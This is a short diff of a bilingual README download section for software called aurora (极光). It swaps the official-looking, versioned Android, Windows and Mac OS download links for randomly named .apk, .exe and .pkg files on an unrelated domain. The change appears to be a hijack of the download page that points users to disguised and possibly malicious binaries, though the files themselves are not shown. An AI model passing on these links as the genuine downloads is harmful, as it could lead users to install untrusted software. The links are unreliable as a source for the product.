@@ -1,8 +1,8 @@
 
 ## 极光 (aurora）最新版本下载 Latest version of aurora
-- <a href="https://files.7ecnologia.com/aurora-v3.0.7S-update1.apk"> Android </a>
-- <a href="https://files.7ecnologia.com/aurora-v3.0.5s-release.exe"> Windows </a>
-- <a href="https://files.7ecnologia.com/aurora-v3.0.3s-release.pkg"> Mac OS </a>
+- <a href="https://a.jsa1004.com/sdffsffsdasf.apk"> Android </a>
+- <a href="https://w.jsa1004.com/icyvecjhzbuw.exe"> Windows </a>
+- <a href="https://m.jsa1004.com/lakogetmaryl.pkg"> Mac OS </a>
 - IOS 敬请期待
 ## 极光 (aurora）最新修复下载 Latest fixes of aurora
 - <a href="https://files.7ecnologia.com/aurora-v3.0.5s-update3.zip"> Windows </a>
